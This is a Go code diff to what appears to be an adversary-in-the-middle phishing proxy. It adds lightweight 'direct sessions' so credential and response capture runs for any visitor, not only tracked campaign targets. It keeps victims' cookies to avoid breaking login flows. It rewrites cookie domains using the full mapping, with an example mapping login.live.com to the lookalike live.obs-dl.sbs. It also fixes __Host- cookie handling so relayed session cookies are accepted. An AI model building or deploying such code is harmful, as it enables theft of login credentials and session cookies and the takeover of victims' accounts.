@@ -464,9 +464,20 @@ func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *Requ
 		return req, m.createDenyResponse(req, reqCtx, denyAction, hasSession)
 	}
 
-	// get or create session and populate context if we have campaign recipient ID or valid session
-	if reqCtx.CampaignRecipientID != nil || reqCtx.SessionID != "" {
-		err = m.resolveSessionContext(req, reqCtx, createSession)
+	// get or create session and populate context
+	// Three cases: (1) campaign recipient ID -> create campaign session
+	//              (2) existing session cookie -> load existing session
+	//              (3) direct visit (no campaign, no session) -> create lightweight direct session
+	createDirectSession := !createSession && reqCtx.SessionID == ""
+
+	if reqCtx.CampaignRecipientID != nil || reqCtx.SessionID != "" || createDirectSession {
+		if createDirectSession {
+			// create a lightweight session for direct proxy visits (no campaign context)
+			// this enables capture processing (onRequestBody, onResponseBody, etc.)
+			err = m.resolveDirectSessionContext(req, reqCtx)
+		} else {
+			err = m.resolveSessionContext(req, reqCtx, createSession)
+		}
 		if err != nil {
 			m.logger.Errorw("failed to resolve session context", "error", err)
 			return req, m.createServiceUnavailableResponse("Service temporarily unavailable")
@@ -638,6 +649,62 @@ func (m *ProxyHandler) resolveSessionContext(req *http.Request, reqCtx *RequestC
 	// populate config map once
 	reqCtx.ConfigMap = m.configToMap(&reqCtx.Session.Config)
 	return nil
+}
+
+// resolveDirectSessionContext creates a lightweight session for direct proxy visits
+// (no campaign context). This enables capture processing (onRequestBody, onResponseBody, etc.)
+// to run for visitors who access the proxy directly without a campaign tracking link.
+func (m *ProxyHandler) resolveDirectSessionContext(req *http.Request, reqCtx *RequestContext) error {
+	session, err := m.createDirectSession(req, reqCtx)
+	if err != nil {
+		return err
+	}
+	reqCtx.SessionID = session.ID
+	reqCtx.SessionCreated = true
+	reqCtx.Session = session
+	reqCtx.ConfigMap = m.configToMap(&session.Config)
+
+	m.logger.Infow("created direct proxy session",
+		"sessionID", session.ID,
+		"phishDomain", reqCtx.PhishDomain,
+		"targetDomain", reqCtx.TargetDomain,
+		"clientIP", m.getClientIP(req),
+	)
+	return nil
+}
+
+// createDirectSession creates a lightweight session without campaign data.
+// It populates the session config from the proxy YAML configuration so that
+// capture rules, rewrite rules, and domain mappings all work correctly.
+func (m *ProxyHandler) createDirectSession(
+	req *http.Request,
+	reqCtx *RequestContext,
+) (*service.ProxySession, error) {
+	// build session config from proxy YAML (same as campaign sessions)
+	sessionConfig := m.buildSessionConfig(reqCtx.TargetDomain, reqCtx.Domain.Name, reqCtx.ProxyConfig)
+
+	// capture client user-agent
+	userAgent := reqCtx.OriginalUserAgent
+	if userAgent == "" {
+		userAgent = req.Header.Get("User-Agent")
+	}
+
+	session := &service.ProxySession{
+		ID:           uuid.New().String(),
+		Domain:       reqCtx.Domain,
+		TargetDomain: reqCtx.TargetDomain,
+		UserAgent:    userAgent,
+		CreatedAt:    time.Now(),
+		// Campaign fields intentionally left nil for direct visits
+	}
+
+	// initialize session data (config, captures, etc.)
+	m.initializeSession(session, sessionConfig)
+
+	// store session in session manager
+	m.SessionManager.StoreSession(session.ID, session)
+
+	return session, nil
 }
 
 func (m *ProxyHandler) applySessionToRequestWithContext(req *http.Request, reqCtx *RequestContext) *http.Request {
@@ -871,10 +938,13 @@ func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCt
 }
 
 func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
-	// set session cookie for new sessions
+	// set session cookie for new sessions (both campaign and direct)
 	if reqCtx.SessionCreated {
-		// clear all existing cookies for initial MITM visit to ensure fresh start
-		m.clearAllCookiesForInitialMitmVisit(resp, reqCtx)
+		// only clear existing cookies for campaign-based MITM visits
+		// direct visits should preserve existing cookies to avoid breaking auth flows
+		if reqCtx.CampaignRecipientID != nil {
+			m.clearAllCookiesForInitialMitmVisit(resp, reqCtx)
+		}
 		m.setSessionCookieWithContext(resp, reqCtx)
 	}
 
@@ -1128,14 +1198,21 @@ func (m *ProxyHandler) processCookiesForPhishingDomainWithContext(resp *http.Res
 		return
 	}
 
-	tempConfig := map[string]service.ProxyServiceDomainConfig{
-		reqCtx.TargetDomain: {To: reqCtx.PhishDomain},
+	// use full config map when available for proper parent domain inference
+	// (e.g., Domain=live.com needs to know about login.live.com -> live.obs-dl.sbs mapping)
+	var cookieConfig map[string]service.ProxyServiceDomainConfig
+	if reqCtx.ConfigMap != nil && len(reqCtx.ConfigMap) > 0 {
+		cookieConfig = reqCtx.ConfigMap
+	} else {
+		cookieConfig = map[string]service.ProxyServiceDomainConfig{
+			reqCtx.TargetDomain: {To: reqCtx.PhishDomain},
+		}
 	}
 
 	resp.Header.Del("Set-Cookie")
 	for _, ck := range cookies {
 		m.adjustCookieSettings(ck, reqCtx.Session, resp)
-		m.rewriteCookieDomain(ck, tempConfig, resp)
+		m.rewriteCookieDomain(ck, cookieConfig, resp)
 		resp.Header.Add("Set-Cookie", ck.String())
 	}
 }
@@ -3024,6 +3101,17 @@ func (m *ProxyHandler) adjustCookieSettings(ck *http.Cookie, session *service.Pr
 }
 
 func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]service.ProxyServiceDomainConfig, resp *http.Response) {
+	// __Host- prefixed cookies MUST NOT have a Domain attribute.
+	// They are bound to the exact host that set them.
+	// If we set Domain on them, the browser will silently reject them.
+	if strings.HasPrefix(ck.Name, "__Host-") {
+		ck.Domain = ""
+		m.logger.Infow("rewriteCookieDomain: __Host- cookie - cleared Domain attribute",
+			"cookieName", ck.Name,
+		)
+		return
+	}
+
 	cDomain := ck.Domain
 	if cDomain == "" {
 		cDomain = resp.Request.Host
